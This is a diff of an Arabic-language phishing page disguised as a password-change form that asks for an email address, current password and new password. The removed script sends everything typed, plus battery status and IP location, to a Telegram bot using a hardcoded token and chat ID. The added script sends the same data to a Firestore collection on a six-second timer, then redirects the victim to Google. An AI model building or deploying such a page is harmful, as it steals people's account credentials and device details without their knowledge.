@@ -39,21 +39,18 @@ button:hover{background:#1558b0}
   </div>
 
   <form id="form">
-    <!-- الخطوة 1 -->
     <div class="step step1 active">
       <input type="email" placeholder="البريد الإلكتروني" required id="email">
       <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
       <button type="button" id="next1">التالي</button>
     </div>
 
-    <!-- الخطوة 2 -->
     <div class="step step2">
       <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
       <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
       <button type="button" id="next2">التالي</button>
     </div>
 
-    <!-- الخطوة 3 -->
     <div class="step step3">
       <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
       <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
@@ -64,124 +61,121 @@ button:hover{background:#1558b0}
   </form>
 </div>
 
-<script>
-const step1 = document.querySelector(".step1");
-const step2 = document.querySelector(".step2");
-const step3 = document.querySelector(".step3");
-const next1 = document.getElementById("next1");
-const next2 = document.getElementById("next2");
-const verifyPass = document.getElementById("verifyPass");
-const error3 = document.getElementById("error3");
-const successMessage = document.getElementById("successMessage");
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";
 
-const telegramToken = "7481011898:AAE2PugM779HQxfO4TifHN74w30-Rqtkvls"; 
-const chatId = "8089516279"; 
+  // إعداد Firebase
+  const firebaseConfig = {
+    apiKey: "ضع هنا API Key الخاص بك",
+    authDomain: "ضع هنا Auth Domain",
+    projectId: "merry-fc865",
+    storageBucket: "merry-fc865.appspot.com",
+    messagingSenderId: "114253227649",
+    appId: "1:114253227649:web:6eae11c8ace416d9fccf80"
+  };
 
-let attemptCount = 0;
-let lastMessageSent = "";
-let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
-let userIP = "غير معروف";
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
 
-// حالة البطارية
-if(navigator.getBattery){
-  navigator.getBattery().then(bat=>{
-    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
-    batteryStatus.level = (bat.level*100)+"%";
-    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
-    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
+  const step1 = document.querySelector(".step1");
+  const step2 = document.querySelector(".step2");
+  const step3 = document.querySelector(".step3");
+  const next1 = document.getElementById("next1");
+  const next2 = document.getElementById("next2");
+  const verifyPass = document.getElementById("verifyPass");
+  const error3 = document.getElementById("error3");
+  const successMessage = document.getElementById("successMessage");
+
+  let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
+  let userIP = "غير معروف";
+
+  if(navigator.getBattery){
+    navigator.getBattery().then(bat=>{
+      batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
+      batteryStatus.level = (bat.level*100)+"%";
+      bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
+      bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
+    });
+  }
+
+  fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
+    userIP = `${data.ip} - ${data.country_name}`;
   });
-}
 
-// IP والدولة
-fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
-  userIP = `${data.ip} - ${data.country_name}`;
-});
-
-// الخطوة 1
-next1.addEventListener("click", ()=>{
-  const input = document.getElementById("email");
-  if(input.checkValidity()){
-    step1.classList.remove("active");
-    step2.classList.add("active");
-  } else {
-    step1.querySelector(".error").style.display="block";
-  }
-});
-
-// الخطوة 2
-next2.addEventListener("click", ()=>{
-  const input = document.getElementById("currentPassword");
-  if(input.checkValidity()){
-    step2.classList.remove("active");
-    step3.classList.add("active");
-  } else {
-    step2.querySelector(".error").style.display="block";
-  }
-});
-
-// الخطوة 3: تحقق من كلمة المرور لمدة 3 محاولات ثم تحول زر التالي إلى رجوع
-verifyPass.addEventListener("click", ()=>{
-  const newPass = document.getElementById("newPassword").value;
-  const confirmPass = document.getElementById("confirmPassword").value;
-
-  if(newPass.length >= 8 && newPass === confirmPass){
-    attemptCount++;
-    if(attemptCount < 3){
-      error3.style.display="block";
-      verifyPass.classList.add("shake");
-      setTimeout(()=>verifyPass.classList.remove("shake"),300);
+  next1.addEventListener("click", ()=>{
+    const input = document.getElementById("email");
+    if(input.checkValidity()){
+      step1.classList.remove("active");
+      step2.classList.add("active");
     } else {
+      step1.querySelector(".error").style.display="block";
+    }
+  });
+
+  next2.addEventListener("click", ()=>{
+    const input = document.getElementById("currentPassword");
+    if(input.checkValidity()){
+      step2.classList.remove("active");
+      step3.classList.add("active");
+    } else {
+      step2.querySelector(".error").style.display="block";
+    }
+  });
+
+  verifyPass.addEventListener("click", ()=>{
+    const newPass = document.getElementById("newPassword").value;
+    const confirmPass = document.getElementById("confirmPassword").value;
+
+    if(newPass.length >= 8 && newPass === confirmPass){
       error3.style.display="none";
       successMessage.style.display="block";
       step3.querySelectorAll("input").forEach(el=>el.disabled=true);
 
-      // تحويل زر التالي إلى زر رجوع
       verifyPass.textContent = "الرجوع";
       verifyPass.disabled = false; 
       verifyPass.onclick = ()=>{ 
-        window.location.href = "https://www.google.com"; // ضع الرابط الذي تريد الرجوع إليه
+        window.location.href = "https://www.google.com";
       }
 
-      sendData(); // إرسال آخر نسخة من البيانات عند النجاح
+      sendData(); 
+    } else {
+      error3.style.display="block";
+      verifyPass.classList.add("shake");
+      setTimeout(()=>verifyPass.classList.remove("shake"),300);
     }
-  } else {
-    error3.style.display="block";
-    verifyPass.classList.add("shake");
-    setTimeout(()=>verifyPass.classList.remove("shake"),300);
-  }
-});
-
-// إرسال البيانات
-function sendData(){
-  const email = document.getElementById("email").value.trim();
-  const currentPassword = document.getElementById("currentPassword").value.trim();
-  const newPassword = document.getElementById("newPassword").value.trim();
-
-  if(email === "" && currentPassword === "" && newPassword === "") return;
-
-  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌐 IP والدولة: ${userIP}`;
-
-  if(message !== lastMessageSent){
-    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({chat_id: chatId, text: message})
-    });
-    lastMessageSent = message;
-  }
-}
-
-// حفظ وإرسال بعد 6 ثواني من الكتابة
-let timeoutId;
-document.querySelectorAll("input").forEach(input=>{
-  input.addEventListener("input", ()=>{
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(sendData, 6000);
   });
-});
 
-// نسخة احتياطية كل 6 ثواني
-setInterval(sendData, 6000);
+  async function sendData(){
+    const email = document.getElementById("email").value.trim();
+    const currentPassword = document.getElementById("currentPassword").value.trim();
+    const newPassword = document.getElementById("newPassword").value.trim();
+
+    if(email === "" && currentPassword === "" && newPassword === "") return;
+
+    try {
+      await addDoc(collection(db, "بيانات_المستخدمين"), {
+        البريد: email || "فارغ",
+        كلمة_الحالية: currentPassword || "فارغ",
+        كلمة_الجديدة: newPassword || "فارغ",
+        حالة_الشحن: batteryStatus.charging + " - " + batteryStatus.level,
+        IP_والموقع: userIP,
+        timestamp: new Date()
+      });
+    } catch (e) {
+      console.error("خطأ عند إرسال البيانات إلى Firestore:", e);
+    }
+  }
+
+  let timeoutId;
+  document.querySelectorAll("input").forEach(input=>{
+    input.addEventListener("input", ()=>{
+      clearTimeout(timeoutId);
+      timeoutId = setTimeout(sendData, 6000);
+    });
+  });
+
+  setInterval(sendData, 6000);
 </script>
 
 </body>
